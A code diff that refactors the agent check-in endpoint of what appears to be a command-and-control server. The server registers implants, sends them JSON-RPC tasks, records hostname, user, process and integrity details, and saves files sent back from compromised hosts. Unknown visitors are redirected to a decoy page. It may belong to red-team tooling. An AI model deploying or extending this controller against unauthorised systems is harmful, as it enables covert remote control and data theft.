@@ -4,7 +4,7 @@ import os
 
 from connect.server.models import db, StagerModel, AgentModel, JobModel, ImplantModel
 from connect.generate import digit_identifier, string_identifier
-from connect.output import print_traceback, error
+from connect.output import print_traceback, print_error
 from connect.convert import base64_to_string, base64_to_bytes, string_to_base64
 from flask_socketio import emit, disconnect, SocketIO
 from flask import Blueprint, request, jsonify, redirect
@@ -25,55 +25,47 @@ def _commit(models: list):
     db.session.commit()
 
 
-def _retrieve_results(job_list):
-    """
-    What job are we working with?
-    Does the job have results? If so, record those based on the following types:
-    Don't emit results < 0 < Emit results
-    (2, -2) = Byte results, sets job results to be the name of the file the byte stream is saved to.
-    (1, -1) = Textual results, sets job results to the raw data.
-
-    :param job_list:
-    :return:
-    """
-    job = JobModel.query.filter_by(identifier=job_list[0]).first()
-    agent = job.agent
-    if not len(job_list) > 1:
-        return
-    results = f'Unknown job type {job.type} for {job.name} from {agent.name}'
-    if job.type == 1 or job.type == -1:
-        results = base64_to_string(job_list[1])
-        websocket.emit('job_results', f'{{"banner":"{job.name.title()} job results from {agent.name}:",'
-                                      f'"results":"{job_list[1]}"}}')
-    if job.type == 2 or job.type == -2:
-        results = base64_to_bytes(job_list[1])
-        file = f'{os.getcwd()}/connect/server/downloads/{string_identifier()}'
-        with open(file, 'wb') as fd:
-            fd.write(results)
-        websocket.emit('job_results', f'{{"banner":"Wrote {job.name.title()} job results from {agent.name} to:",'
-                                      f'"results":"{string_to_base64(file)}"}}')
-        return
-    if 'Job Failed:' in results:
-        job.completed = datetime.datetime.now()
-        job.results = results
-        _commit([agent, job])
-        return
-    if job.name == 'hostname':
-        agent.hostname = results
-    if job.name == 'whoami':
-        agent.username = results
-    if job.name == 'pid':
-        agent.pid = results
-    if job.name == 'integrity':
-        agent.integrity = results
-    if job.name == 'set sleep':
-        _tmp = results.split()
-        agent.sleep = _tmp[3]
-    if job.name == 'set jitter':
-        _tmp = results.split()
-        agent.jitter = _tmp[3]
+def _retrieve_error(job, error):
+    job.result = error['message']
     job.completed = datetime.datetime.now()
-    job.results = results
+    _commit([job])
+
+
+def _retrieve_results(job, result):
+    agent = job.agent
+
+    # A batch result is reserved to set agent properties.
+    if isinstance(result, list):
+        _result = result[0]
+        _property = base64_to_string(result[1])
+        if job.name == 'hostname':
+            agent.hostname = _property
+        if job.name == 'whoami':
+            agent.username = _property
+        if job.name == 'pid':
+            agent.pid = _property
+        if job.name == 'integrity':
+            agent.integrity = _property
+        if job.name == 'set sleep':
+            agent.sleep = _property
+        if job.name == 'set jitter':
+            agent.jitter = _property
+    else:
+        _result = result
+
+    if job.type == 1 or job.type == -1:
+        job.results = base64_to_string(_result)
+        websocket.emit('job_results', f'{{"banner":"{job.name.title()} job results from {agent.name}:",'
+                                      f'"results":"{_result}"}}')
+    if job.type == 2 or job.type == -2:
+        file = base64_to_bytes(_result)
+        filename = f'{os.getcwd()}/connect/server/downloads/{string_identifier()}'
+        job.results = filename
+        with open(filename, 'wb') as fd:
+            fd.write(file)
+        websocket.emit('job_results', f'{{"banner":"Wrote {job.name.title()} job results from {agent.name} to:",'
+                                      f'"results":"{string_to_base64(filename)}"}}')
+    job.completed = datetime.datetime.now()
     _commit([agent, job])
 
 
@@ -91,7 +83,7 @@ def _retrieve_unsent_jobs(job):
     """
     If the job is a check_in then we need to grab uncompleted jobs for the agent.
 
-    :param job_list:
+    :param job:
     :return:
     """
     _unsent_jobs = []
@@ -103,51 +95,53 @@ def _retrieve_unsent_jobs(job):
         websocket.emit('job_sent', f'Sent job {unsent_job.name.title()} to {agent.name}')
         unsent_job.sent = datetime.datetime.now()
         _commit([unsent_job])
-        _unsent_jobs.append({"id": str(unsent_job.identifier), "name": unsent_job.name,
-                             "arguments": unsent_job.arguments})
+        _unsent_jobs.append({"jsonrpc": "2.0", "method": unsent_job.name, "params": unsent_job.arguments,
+                             "id": str(unsent_job.identifier)})
     return _unsent_jobs
 
 
 @check_in.route('/<path:uri>', methods=['GET', 'POST'])
 def endpoint(uri):
     """
-    The check_in endpoint for agents.
+    The check_in endpoint for agents and implants.
 
     :param uri: The URI requested.
     """
+    implant_key = request.get_data().decode('utf-8')
+    implant = ImplantModel.query.filter_by(key=implant_key).first()
+    if implant:
+        agent = AgentModel(implant=implant, sleep=implant.sleep, jitter=implant.jitter)
+        check_in_job = JobModel(name='check_in', agent=agent, type=-1)
+        check_in_job.completed = datetime.datetime.now()
+        check_in_job.sent = datetime.datetime.now()
+        _commit([agent, check_in_job])
+        batch_request = [{"jsonrpc": "2.0", "method": check_in_job.name, "params": check_in_job.arguments,
+                          "id": str(check_in_job.identifier)}]
+        return jsonify(batch_request)
     try:
-        jobs_req = request.get_json(force=True)
+        batch_response = request.get_json(force=True)
     except Exception as e:
-        error(f'Failed to parse jobs_req: {request.get_data()} {uri} : {e}')
-        return redirect("http://www.google.com")
+        print_error(f'Failed to parse JSON-RPC 2.0 Batch Response: {request.get_data()} {uri} : {e}')
+        return redirect("https://www.google.com")
 
-    unsent_jobs = []
-    for job_list in jobs_req:
-        try:
-            # Is this an implant checking in?
-            # If so, create an agent and send it a check_in job.
-            implants = ImplantModel.query.all()
-            for implant in implants:
-                if not job_list[0] == implant.key:
-                    continue
-                agent = AgentModel(implant=implant, sleep=implant.sleep, jitter=implant.jitter)
-                check_in_job = JobModel(name='check_in', agent=agent, type=-1)
-                check_in_job.completed = datetime.datetime.now()
-                check_in_job.sent = datetime.datetime.now()
-                _commit([agent, check_in_job])
-                return jsonify({"job_rep": [{"id": str(check_in_job.identifier), "name": check_in_job.name,
-                                             "arguments": check_in_job.arguments}]})
-
-            job = JobModel.query.filter_by(identifier=job_list[0]).first()
+    try:
+        batch_request = []
+        for job in batch_response:
+            job_id = job['id'] if 'id' in job.keys() else None
+            job_result = job['result'] if 'result' in job.keys() else None
+            job_error = job['error'] if 'error' in job.keys() else None
+            job = JobModel.query.filter_by(identifier=job_id).first()
             if not job:
-                return redirect("http://www.google.com")
-            _retrieve_results(job_list)
-            if not job.name == 'check_in':
-                continue
-            unsent_jobs.extend(_retrieve_unsent_jobs(job))
-        except Exception:
-            print_traceback()
-    return jsonify({"job_rep": unsent_jobs})
+                return redirect("https://www.google.com")
+            if job_result:
+                _retrieve_results(job, job_result)
+            if job_error:
+                _retrieve_error(job, job_error)
+            if job.name == 'check_in':
+                batch_request.extend(_retrieve_unsent_jobs(job))
+        return jsonify(batch_request)
+    except Exception:
+        print_traceback()
 
 
 def connect(auth):
